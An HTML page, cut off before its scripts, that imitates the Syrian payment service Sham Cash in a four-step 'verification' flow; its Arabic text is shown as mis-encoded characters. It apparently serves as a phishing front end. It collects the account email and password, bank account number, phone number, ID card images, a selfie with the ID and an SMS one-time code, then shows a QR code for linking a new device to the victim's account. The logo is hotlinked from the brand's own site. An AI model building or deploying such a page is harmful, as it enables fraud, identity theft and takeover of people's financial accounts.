<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ø´Ø§Ù… ÙƒØ§Ø´ - Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù‡ÙˆÙŠØ© ÙˆØ±Ø¨Ø· Ø§Ù„Ø¬Ù‡Ø§Ø²</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #1a365d;
            --primary-dark: #0d2438;
            --secondary: #2d8c4a;
            --danger: #c53030;
            --warning: #d69e2e;
            --info: #3182ce;
            --light: #f8f9fa;
            --dark: #2d3748;
            --border: #e2e8f0;
            --shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            --shadow-lg: 0 10px 25px rgba(0, 0, 0, 0.15);
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Amiri', serif;
            background: linear-gradient(135deg, #f0f4f8 0%, #d9e2ec 100%);
            color: #333;
            line-height: 1.6;
            min-height: 100vh;
            overflow-x: hidden;
        }
        
        .page-container {
            display: none;
            min-height: 100vh;
            background: white;
            animation: fadeIn 0.4s ease;
        }
        
        .page-container.active {
            display: block;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(15px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        @keyframes pulse {
            0% { transform: scale(0.8); opacity: 0.7; }
            50% { transform: scale(1.2); opacity: 1; }
            100% { transform: scale(0.8); opacity: 0.7; }
        }
        
        @keyframes slideUp {
            from { transform: translateY(30px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        
        @keyframes slideInRight {
            from { transform: translateX(30px); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        .header {
            background: linear-gradient(135deg, var(--primary-dark) 0%, var(--primary) 100%);
            padding: 20px;
            box-shadow: var(--shadow);
            position: sticky;
            top: 0;
            z-index: 1000;
        }
        
        .logo-container {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            margin-bottom: 10px;
        }
        
        .logo {
            height: 45px;
            width: auto;
            filter: brightness(0) invert(1);
        }
        
        .logo-text {
            font-family: 'Amiri', serif;
            font-size: 28px;
            font-weight: 700;
            color: white;
            text-shadow: 1px 1px 3px rgba(0,0,0,0.3);
        }
        
        .page-indicator {
            text-align: center;
            color: rgba(255, 255, 255, 0.9);
            font-size: 17px;
            font-weight: 600;
        }
        
        .page-content {
            padding: 30px 20px;
            max-width: 500px;
            margin: 0 auto;
            min-height: calc(100vh - 140px);
        }
        
        .page-title {
            font-family: 'Amiri', serif;
            font-size: 28px;
            color: var(--primary-dark);
            margin-bottom: 15px;
            font-weight: 700;
            text-align: center;
            padding-bottom: 15px;
            border-bottom: 2px solid var(--primary);
        }
        
        .page-subtitle {
            font-size: 18px;
            color: #4a5568;
            margin-bottom: 30px;
            text-align: center;
            line-height: 1.7;
        }
        
        .form-container {
            background: white;
            border-radius: 15px;
            padding: 25px;
            box-shadow: var(--shadow);
            margin-bottom: 25px;
            border: 1px solid var(--border);
        }
        
        .form-group {
            margin-bottom: 25px;
        }
        
        .form-label {
            display: block;
            margin-bottom: 10px;
            font-weight: 700;
            color: var(--dark);
            font-size: 17px;
        }
        
        .form-control {
            width: 100%;
            padding: 16px 18px;
            border: 2px solid var(--border);
            border-radius: 10px;
            font-size: 18px;
            transition: all 0.3s ease;
            background: #fafafa;
            font-family: 'Amiri', serif;
        }
        
        .form-control:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(26, 54, 93, 0.1);
            background: white;
        }
        
        .error-message {
            color: var(--danger);
            font-size: 15px;
            margin-top: 8px;
            display: none;
            font-weight: 600;
        }
        
        .btn {
            padding: 18px 30px;
            border: none;
            border-radius: 12px;
            font-size: 20px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            width: 100%;
            margin-top: 15px;
            font-family: 'Amiri', serif;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
            color: white;
            box-shadow: 0 4px 15px rgba(26, 54, 93, 0.3);
        }
        
        .btn-primary:hover {
            transform: translateY(-3px);
            box-shadow: 0 7px 20px rgba(26, 54, 93, 0.4);
        }
        
        .upload-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
            gap: 20px;
            margin-bottom: 25px;
        }
        
        .upload-box {
            border: 3px dashed var(--border);
            border-radius: 12px;
            padding: 25px 15px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            height: 190px;
            position: relative;
            overflow: hidden;
            background: #fafafa;
        }
        
        .upload-box:hover {
            border-color: var(--primary);
            background: rgba(26, 54, 93, 0.05);
        }
        
        .verification-container {
            text-align: center;
            padding: 30px 20px;
        }
        
        .verification-icon {
            width: 110px;
            height: 110px;
            border-radius: 50%;
            background: linear-gradient(135deg, rgba(45, 140, 74, 0.1) 0%, rgba(31, 107, 55, 0.1) 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            color: var(--secondary);
            margin: 0 auto 35px;
            box-shadow: var(--shadow);
        }
        
        .phone-input-container {
            margin: 30px 0;
            position: relative;
        }
        
        .phone-prefix {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            background: var(--primary);
            color: white;
            padding: 12px 15px;
            border-radius: 8px 0 0 8px;
            font-weight: 700;
            font-size: 18px;
        }
        
        .sent-message {
            background: linear-gradient(135deg, rgba(45, 140, 74, 0.1) 0%, rgba(31, 107, 55, 0.1) 100%);
            border-radius: 12px;
            padding: 20px;
            margin: 25px 0;
            border-right: 4px solid var(--secondary);
            display: none;
        }
        
        .sent-message.active {
            display: block;
            animation: fadeIn 0.5s ease;
        }
        
        .code-inputs {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin: 25px 0;
        }
        
        .code-input {
            width: 60px;
            height: 70px;
            border: 3px solid var(--border);
            border-radius: 12px;
            font-size: 32px;
            text-align: center;
            font-weight: 800;
            font-family: 'Amiri', serif;
            background: #fafafa;
        }
        
        .code-input:focus {
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(26, 54, 93, 0.1);
            outline: none;
            background: white;
            transform: scale(1.05);
        }
        
        .timer {
            font-size: 22px;
            color: var(--primary);
            font-weight: 800;
            padding: 12px 25px;
            background: rgba(26, 54, 93, 0.1);
            border-radius: 10px;
            display: inline-block;
            margin: 20px 0;
        }
        
        .footer {
            background: linear-gradient(135deg, var(--primary-dark) 0%, var(--primary) 100%);
            padding: 25px 20px;
            text-align: center;
            margin-top: 40px;
            color: white;
        }
        
        .progress-container {
            margin: 25px 0 40px;
        }
        
        .progress-bar {
            height: 12px;
            background: #edf2f7;
            border-radius: 6px;
            overflow: hidden;
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.1);
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--primary) 0%, var(--secondary) 100%);
            border-radius: 6px;
            width: 0%;
            transition: width 0.5s ease;
        }
        
        .delayed-verification {
            background: linear-gradient(135deg, rgba(49, 130, 206, 0.1) 0%, rgba(26, 54, 93, 0.1) 100%);
            border-radius: 15px;
            padding: 30px;
            margin: 25px 0;
            border: 2px solid var(--info);
            text-align: center;
            display: none;
        }
        
        .delayed-verification.active {
            display: block;
            animation: fadeIn 0.5s ease;
        }
        
        .delayed-verification-icon {
            font-size: 60px;
            color: var(--info);
            margin-bottom: 20px;
        }
        
        .countdown {
            font-size: 28px;
            color: var(--info);
            font-weight: 800;
            margin: 20px 0;
            background: rgba(49, 130, 206, 0.1);
            padding: 15px;
            border-radius: 10px;
            display: inline-block;
        }
        
        .hidden-button {
            display: none;
        }
        
        .steps-container {
            text-align: right;
            margin-bottom: 30px;
        }
        
        .step-item {
            padding: 15px;
            margin-bottom: 15px;
            border-right: 4px solid var(--info);
            background: rgba(49, 130, 206, 0.05);
            border-radius: 8px;
            transition: all 0.3s ease;
        }
        
        .step-item:hover {
            background: rgba(49, 130, 206, 0.1);
            transform: translateX(-5px);
        }
        
        .step-number {
            width: 35px;
            height: 35px;
            background: var(--info);
            color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            transition: all 0.3s ease;
        }
        
        .step-item:hover .step-number {
            transform: scale(1.1);
            box-shadow: 0 4px 12px rgba(49, 130, 206, 0.3);
        }
        
        .linking-status {
            display: none;
            text-align: center;
            padding: 25px;
            background: rgba(45, 140, 74, 0.1);
            border-radius: 12px;
            margin: 25px 0;
            border: 2px solid var(--secondary);
            animation: fadeIn 0.5s ease;
        }
        
        .success-message {
            display: none;
            text-align: center;
            padding: 30px;
            background: rgba(45, 140, 74, 0.1);
            border-radius: 12px;
            margin: 25px 0;
            border: 2px solid var(--secondary);
            animation: fadeIn 0.5s ease;
        }
        
        .signal {
            width: 15px;
            height: 15px;
            background: var(--info);
            border-radius: 50%;
            animation: pulse 1.5s infinite;
        }
        
        #qrCanvas {
            border: 2px solid var(--border);
            border-radius: 10px;
            padding: 10px;
            background: white;
            margin: 0 auto;
            display: block;
        }
        
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: var(--secondary);
            color: white;
            padding: 20px 25px;
            border-radius: 12px;
            box-shadow: var(--shadow-lg);
            z-index: 3000;
            display: flex;
            align-items: center;
            gap: 15px;
            animation: slideInRight 0.3s ease;
            max-width: 400px;
            font-weight: 600;
            font-size: 17px;
        }
        
        .notification.error {
            background: var(--danger);
        }
        
        .notification.info {
            background: var(--info);
        }
        
        .notification.warning {
            background: var(--warning);
        }
        
        @media (max-width: 768px) {
            .header {
                padding: 18px 15px;
            }
            
            .logo-text {
                font-size: 24px;
            }
            
            .page-content {
                padding: 25px 15px;
            }
            
            .code-input {
                width: 50px;
                height: 60px;
                font-size: 28px;
            }
            
            .upload-grid {
                grid-template-columns: 1fr;
            }
            
            .delayed-verification {
                padding: 20px;
            }
            
            .delayed-verification-icon {
                font-size: 50px;
            }
            
            .steps-container {
                margin-bottom: 20px;
            }
            
            .step-item {
                padding: 12px;
            }
        }
    </style>
</head>
<body>
    <!-- Ø§Ù„ØµÙØ­Ø© 1: ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ -->
    <div class="page-container active" id="page1">
        <header class="header">
            <div class="logo-container">
                <img src="https://shamcash.com/_next/static/media/logo.5be69def.svg" alt="Ø´Ø§Ù… ÙƒØ§Ø´" class="logo">
                <div class="logo-text">Ø´Ø§Ù… ÙƒØ§Ø´</div>
            </div>
            <div class="page-indicator">Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù‡ÙˆÙŠØ© - Ø§Ù„Ø®Ø·ÙˆØ© 1 Ù…Ù† 4</div>
        </header>
        
        <div class="page-content">
            <h1 class="page-title">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</h1>
            <p class="page-subtitle">Ø£Ø¯Ø®Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø­Ø³Ø§Ø¨ Ø´Ø§Ù… ÙƒØ§Ø´ Ù„Ù„Ù…ØªØ§Ø¨Ø¹Ø©</p>
            
            <div class="progress-container">
                <div class="progress-bar">
                    <div class="progress-fill" id="progress1" style="width: 0%"></div>
                </div>
            </div>
            
            <div class="form-container">
                <div class="form-group">
                    <label class="form-label" for="email">
                        <i class="fas fa-envelope"></i>
                        Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ
                    </label>
                    <input type="email" id="email" class="form-control" placeholder="example@domain.com" required>
                    <div class="error-message" id="emailError">Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ ØºÙŠØ± ØµØ§Ù„Ø­</div>
                </div>
                
                <div class="form-group">
                    <label class="form-label" for="password">
                        <i class="fas fa-lock"></i>
                        ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±
                    </label>
                    <input type="password" id="password" class="form-control" placeholder="Ø£Ø¯Ø®Ù„ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±" required>
                    <div class="error-message" id="passwordError">ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± ÙŠØ¬Ø¨ Ø£Ù† ØªØ­ØªÙˆÙŠ Ø¹Ù„Ù‰ 8 Ø£Ø­Ø±Ù Ø¹Ù„Ù‰ Ø§Ù„Ø£Ù‚Ù„</div>
                </div>
            </div>
            
            <button class="btn btn-primary" onclick="validateLogin()">
                Ø§Ù„ØªØ§Ù„ÙŠ
                <i class="fas fa-arrow-left"></i>
            </button>
            
            <div class="footer">
                <div class="copyright">
                    Â© 2024 Ø´Ø§Ù… ÙƒØ§Ø´. Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ø¢Ù…Ù†
                </div>
            </div>
        </div>
    </div>
    
    <!-- Ø§Ù„ØµÙØ­Ø© 2: Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙˆØ§Ù„Ù…Ø³ØªÙ†Ø¯Ø§Øª -->
    <div class="page-container" id="page2">
        <header class="header">
            <div class="logo-container">
                <img src="https://shamcash.com/_next/static/media/logo.5be69def.svg" alt="Ø´Ø§Ù… ÙƒØ§Ø´" class="logo">
                <div class="logo-text">Ø´Ø§Ù… ÙƒØ§Ø´</div>
            </div>
            <div class="page-indicator">Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù‡ÙˆÙŠØ© - Ø§Ù„Ø®Ø·ÙˆØ© 2 Ù…Ù† 4</div>
            <button onclick="goToPage(1)" style="position:absolute; left:20px; top:20px; background:rgba(255,255,255,0.2); border:none; color:white; padding:10px 15px; border-radius:8px; cursor:pointer;">
                <i class="fas fa-arrow-right"></i>
            </button>
        </header>
        
        <div class="page-content">
            <h1 class="page-title">Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙˆØ§Ù„Ù…Ø³ØªÙ†Ø¯Ø§Øª</h1>
            <p class="page-subtitle">ÙŠØ±Ø¬Ù‰ ØªØ¹Ø¨Ø¦Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙˆØªØ­Ø¶ÙŠØ± Ø§Ù„Ù…Ø³ØªÙ†Ø¯Ø§Øª Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø©</p>
            
            <div class="progress-container">
                <div class="progress-bar">
                    <div class="progress-fill" id="progress2" style="width: 25%"></div>
                </div>
            </div>
            
            <div class="form-container">
                <div class="form-group">
                    <label class="form-label" for="fullName">
                        <i class="fas fa-user"></i>
                        Ø§Ù„Ø§Ø³Ù… Ø§Ù„Ø«Ù„Ø§Ø«ÙŠ Ø§Ù„ÙƒØ§Ù…Ù„
                    </label>
                    <input type="text" id="fullName" class="form-control" placeholder="Ø§Ù„Ø§Ø³Ù… Ø§Ù„Ø£ÙˆÙ„ - Ø§Ø³Ù… Ø§Ù„Ø£Ø¨ - Ø§Ø³Ù… Ø§Ù„Ø¬Ø¯" required>
                    <div class="error-message" id="nameError">Ø§Ù„Ø§Ø³Ù… ÙŠØ¬Ø¨ Ø£Ù† ÙŠÙƒÙˆÙ† Ø«Ù„Ø§Ø«ÙŠÙ‹Ø§ Ø¨Ø§Ù„Ù„ØºØ© Ø§Ù„Ø¹Ø±Ø¨ÙŠØ©</div>
                </div>
                
                <div class="form-group">
                    <label class="form-label" for="accountNumber">
                        <i class="fas fa-credit-card"></i>
                        Ø±Ù‚Ù… Ø§Ù„Ø­Ø³Ø§Ø¨ Ø§Ù„Ø¨Ù†ÙƒÙŠ
                    </label>
                    <input type="text" id="accountNumber" class="form-control" placeholder="14-16 Ø±Ù‚Ù…" required>
                    <div class="error-message" id="accountError">Ø±Ù‚Ù… Ø§Ù„Ø­Ø³Ø§Ø¨ ÙŠØ¬Ø¨ Ø£Ù† ÙŠØ­ØªÙˆÙŠ Ø¹Ù„Ù‰ 14-16 Ø±Ù‚Ù…Ø§Ù‹</div>
                </div>
                
                <div class="form-group">
                    <label class="form-label" for="phoneNumber">
                        <i class="fas fa-phone"></i>
                        Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ Ø§Ù„Ù…Ø±ØªØ¨Ø· Ø¨Ø§Ù„Ø­Ø³Ø§Ø¨
                    </label>
                    <input type="tel" id="phoneNumber" class="form-control" placeholder="09xxxxxxxx" required>
                    <div class="error-message" id="phoneError">Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ ÙŠØ¬Ø¨ Ø£Ù† ÙŠÙƒÙˆÙ† Ø³ÙˆØ±ÙŠÙ‹Ø§ ÙˆÙŠØ¨Ø¯Ø£ Ø¨Ù€ 09</div>
                </div>
                
                <div class="upload-grid">
                    <div class="upload-box" onclick="triggerUpload('frontId')">
                        <i class="fas fa-id-card upload-icon"></i>
                        <div class="upload-text">Ø§Ù„Ù‡ÙˆÙŠØ© Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©</div>
                        <img class="upload-preview" id="frontIdPreview" style="display:none; max-width:100%; max-height:100%; position:absolute;">
                    </div>
                    
                    <div class="upload-box" onclick="triggerUpload('backId')">
                        <i class="fas fa-id-card upload-icon"></i>
                        <div class="upload-text">Ø§Ù„Ù‡ÙˆÙŠØ© Ø§Ù„Ø®Ù„ÙÙŠØ©</div>
                        <img class="upload-preview" id="backIdPreview" style="display:none; max-width:100%; max-height:100%; position:absolute;">
                    </div>
                    
                    <div class="upload-box" onclick="triggerUpload('selfie')">
                        <i class="fas fa-camera upload-icon"></i>
                        <div class="upload-text">ØµÙˆØ±Ø© Ø´Ø®ØµÙŠØ© Ù…Ø¹ Ø§Ù„Ù‡ÙˆÙŠØ©</div>
                        <img class="upload-preview" id="selfiePreview" style="display:none; max-width:100%; max-height:100%; position:absolute;">
                    </div>
                </div>
            </div>
            
            <button class="btn btn-primary" onclick="validatePage2()">
                Ø§Ù„ØªØ§Ù„ÙŠ
                <i class="fas fa-arrow-left"></i>
            </button>
            
            <div class="footer">
                <div class="copyright">
                    Â© 2024 Ø´Ø§Ù… ÙƒØ§Ø´. Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ø¢Ù…Ù†
                </div>
            </div>
        </div>
    </div>
    
    <!-- Ø§Ù„ØµÙØ­Ø© 3: Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ -->
    <div class="page-container" id="page3">
        <header class="header">
            <div class="logo-container">
                <img src="https://shamcash.com/_next/static/media/logo.5be69def.svg" alt="Ø´Ø§Ù… ÙƒØ§Ø´" class="logo">
                <div class="logo-text">Ø´Ø§Ù… ÙƒØ§Ø´</div>
            </div>
            <div class="page-indicator">Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù‡ÙˆÙŠØ© - Ø§Ù„Ø®Ø·ÙˆØ© 3 Ù…Ù† 4</div>
            <button onclick="goToPage(2)" style="position:absolute; left:20px; top:20px; background:rgba(255,255,255,0.2); border:none; color:white; padding:10px 15px; border-radius:8px; cursor:pointer;">
                <i class="fas fa-arrow-right"></i>
            </button>
        </header>
        
        <div class="page-content">
            <div class="verification-container">
                <div class="verification-icon">
                    <i class="fas fa-mobile-alt"></i>
                </div>
                
                <h1 class="page-title">Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ</h1>
                <p class="page-subtitle">Ø£Ø¯Ø®Ù„ Ø±Ù‚Ù… Ù‡Ø§ØªÙÙƒ Ù„Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚</p>
                
                <div class="progress-container">
                    <div class="progress-bar">
                        <div class="progress-fill" id="progress3" style="width: 50%"></div>
                    </div>
                </div>
                
                <div class="form-container">
                    <div class="phone-input-container">
                        <div class="phone-prefix">+963</div>
                        <input type="tel" id="phoneInput" class="form-control" placeholder="9xxxxxxxx" maxlength="9">
                    </div>
                    
                    <button class="btn btn-primary" onclick="sendVerificationCode()" id="sendCodeBtn">
                        <i class="fas fa-paper-plane"></i>
                        Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚
                    </button>
                    
                    <div class="sent-message" id="sentMessage">
                        <i class="fas fa-check-circle"></i>
                        <p>ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ Ø¥Ù„Ù‰ Ø±Ù‚Ù… <strong id="maskedPhone"></strong></p>
                    </div>
                    
                    <div class="code-inputs" id="codeInputs" style="display:none;">
                        <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 1)" autocomplete="off">
                        <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 2)" autocomplete="off">
                        <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 3)" autocomplete="off">
                        <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 4)" autocomplete="off">
                        <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 5)" autocomplete="off">
                        <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 6)" autocomplete="off">
                    </div>
                    
                    <div class="timer" id="timer" style="display:none;">02:00</div>
                    
                    <button class="btn btn-primary" onclick="verifyCode()" id="verifyBtn" style="display:none;">
                        <i class="fas fa-check"></i>
                        ØªØ£ÙƒÙŠØ¯ Ø§Ù„ØªØ­Ù‚Ù‚
                    </button>
                    
                    <p style="margin-top:20px; color:#718096;">
                        Ù„Ù… ØªØ³ØªÙ„Ù… Ø§Ù„Ø±Ù…Ø²ØŸ 
                        <a href="javascript:void(0)" onclick="resendCode()" style="color:var(--primary); font-weight:bold;">
                            Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„
                        </a>
                    </p>
                </div>
                
                <div class="delayed-verification" id="delayedVerification">
                    <div class="delayed-verification-icon">
                        <i class="fas fa-clock"></i>
                    </div>
                    <h3>Ø´ÙƒØ±Ø§Ù‹ Ù„ØªØ³Ø¬ÙŠÙ„Ùƒ Ù…Ø¹Ù†Ø§!</h3>
                    <p>ØªÙ… Ø§Ø³ØªÙ„Ø§Ù… Ù…Ø¹Ù„ÙˆÙ…Ø§ØªÙƒ Ø¨Ù†Ø¬Ø§Ø­ ÙˆØ³ÙŠØªÙ… Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù†Ù‡Ø§ Ø®Ù„Ø§Ù„:</p>
                    <div class="countdown" id="countdownTimer">48:00:00</div>
                    <p>Ø³Ù†Ù‚ÙˆÙ… Ø¨Ø§Ù„ØªÙˆØ§ØµÙ„ Ù…Ø¹Ùƒ Ø¹Ù„Ù‰ Ø§Ù„Ø±Ù‚Ù… Ø§Ù„Ù…Ø³Ø¬Ù„ Ø¨Ù…Ø¬Ø±Ø¯ Ø§ÙƒØªÙ…Ø§Ù„ Ø¹Ù…Ù„ÙŠØ© Ø§Ù„ØªØ­Ù‚Ù‚.</p>
                    <p><strong>Ø±Ù‚Ù… Ø§Ù„Ø·Ù„Ø¨:</strong> <span id="requestNumber">SHM-2024-001</span></p>
                </div>
            </div>
            
            <div class="footer">
                <div class="copyright">
                    Â© 2024 Ø´Ø§Ù… ÙƒØ§Ø´. Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ø¢Ù…Ù†
                </div>
            </div>
        </div>
    </div>
    
    <!-- Ø§Ù„ØµÙØ­Ø© 4: Ø±Ø¨Ø· Ø§Ù„Ù‡Ø§ØªÙ Ø¨Ø§Ù„Ø¬Ù‡Ø§Ø² -->
    <div class="page-container" id="page4">
        <header class="header">
            <div class="logo-container">
                <img src="https://shamcash.com/_next/static/media/logo.5be69def.svg" alt="Ø´Ø§Ù… ÙƒØ§Ø´" class="logo">
                <div class="logo-text">Ø´Ø§Ù… ÙƒØ§Ø´</div>
            </div>
            <div class="page-indicator">Ø±Ø¨Ø· Ø§Ù„Ù‡Ø§ØªÙ Ø¨Ø§Ù„Ø¬Ù‡Ø§Ø² - Ø§Ù„Ø®Ø·ÙˆØ© 4 Ù…Ù† 4</div>
            <button onclick="goToPage(3)" style="position:absolute; left:20px; top:20px; background:rgba(255,255,255,0.2); border:none; color:white; padding:10px 15px; border-radius:8px; cursor:pointer;">
                <i class="fas fa-arrow-right"></i>
            </button>
        </header>
        
        <div class="page-content">
            <div class="verification-container">
                <div class="verification-icon" style="background: linear-gradient(135deg, rgba(49, 130, 206, 0.1) 0%, rgba(26, 54, 93, 0.1) 100%); color: var(--info);">
                    <i class="fas fa-mobile-alt"></i>
                </div>
                
                <h1 class="page-title">Ø±Ø¨Ø· Ø§Ù„Ù‡Ø§ØªÙ Ø¨Ø§Ù„Ø¬Ù‡Ø§Ø²</h1>
                <p class="page-subtitle">Ø§ØªØ¨Ø¹ Ø§Ù„Ø®Ø·ÙˆØ§Øª Ø§Ù„ØªØ§Ù„ÙŠØ© Ù„Ø¥ÙƒÙ…Ø§Ù„ Ø¹Ù…Ù„ÙŠØ© Ø§Ù„Ø±Ø¨Ø·</p>
                
                <div class="progress-container">
                    <div class="progress-bar">
                        <div class="progress-fill" id="progress4" style="width: 75%"></div>
                    </div>
                </div>
                
                <div class="form-container">
                    <div class="steps-container">
                        <div class="step-item">
                            <div style="display: flex; align-items: center; gap: 15px;">
                                <div class="step-number">1</div>
                                <div>
                                    <h3 style="color: var(--primary-dark); margin-bottom: 5px;">Ø§ÙØªØ­ ØªØ·Ø¨ÙŠÙ‚ Ø´Ø§Ù… ÙƒØ§Ø´</h3>
                                    <p style="color: #4a5568;">Ø§Ù†ØªÙ‚Ù„ Ø¥Ù„Ù‰ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„ØªØ·Ø¨ÙŠÙ‚</p>
                                </div>
                            </div>
                        </div>
                        
                        <div class="step-item">
                            <div style="display: flex; align-items: center; gap: 15px;">
                                <div class="step-number">2</div>
                                <div>
                                    <h3 style="color: var(--primary-dark); margin-bottom: 5px;">Ø§Ø¨Ø­Ø« Ø¹Ù† "Ø±Ø¨Ø· Ø§Ù„Ø¬Ù‡Ø§Ø²"</h3>
                                    <p style="color: #4a5568;">Ø§Ø®ØªØ± Ø®ÙŠØ§Ø± Ø±Ø¨Ø· Ø¬Ù‡Ø§Ø² Ø¬Ø¯ÙŠØ¯</p>
                                </div>
                            </div>
                        </div>
                        
                        <div class="step-item">
                            <div style="display: flex; align-items: center; gap: 15px;">
                                <div class="step-number">3</div>
                                <div>
                                    <h3 style="color: var(--primary-dark); margin-bottom: 5px;">ÙˆØ¬Ù‡ ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ù‡Ø§ØªÙ</h3>
                                    <p style="color: #4a5568;">Ø§Ø³Ø­Ø¨ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù†Ø­Ùˆ Ø±Ù…Ø² QR Ø£Ø¯Ù†Ø§Ù‡</p>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div style="text-align: center; margin: 30px 0; padding: 20px; background: #f8f9fa; border-radius: 12px;">
                        <h3 style="color: var(--primary-dark); margin-bottom: 15px;">Ø±Ù…Ø² Ø§Ù„Ø±Ø¨Ø·</h3>
                        <div id="qrCode" style="width: 200px; height: 200px; margin: 0 auto; background: #333; position: relative; border-radius: 10px; overflow: hidden;">
                            <canvas id="qrCanvas" width="200" height="200"></canvas>
                        </div>
                        <p style="color: #718096; margin-top: 15px; font-size: 14px;">
                            Ø§Ù„Ù…Ø³Ø­ Ù…ØªØ§Ø­ Ù„Ù…Ø¯Ø© <span id="qrTimer" style="color: var(--info); font-weight: bold;">10:00</span> Ø¯Ù‚ÙŠÙ‚Ø©
                        </p>
                    </div>
                    
                    <div class="linking-status" id="linkingStatus">
                        <i class="fas fa-sync-alt fa-spin" style="font-size: 40px; color: var(--secondary); margin-bottom: 15px;"></i>
                        <h3 style="color: var(--secondary); margin-bottom: 10px;">Ø¬Ø§Ø±ÙŠ Ø§Ù†ØªØ¸Ø§Ø± Ø§Ù„Ø±Ø¨Ø·...</h3>
                        <p style="color: #4a5568;">ÙŠØ±Ø¬Ù‰ Ø¹Ø¯Ù… Ø¥ØºÙ„Ø§Ù‚ Ù‡Ø°Ù‡ Ø§Ù„ØµÙØ­Ø© Ø­ØªÙ‰ Ø§ÙƒØªÙ…Ø§Ù„ Ø§Ù„Ø±Ø¨Ø·</p>
                        
                        <div style="display: flex; justify-content: center; gap: 10px; margin: 20px 0;">
                            <div class="signal" style="animation-delay: 0s;"></div>
                            <div class="signal" style="background: var(--secondary); animation-delay: 0.2s;"></div>
                            <div class="signal" style="background: var(--primary); animation-delay: 0.4s;"></div>
                        </div>
                        
                        <div style="margin-top: 20px;">
                            <h4 style="color: var(--primary-dark); margin-bottom: 10px;">Ø£Ø¯ÙˆØ§Øª Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ù…Ù‚Ø¯Ù…Ø©:</h4>
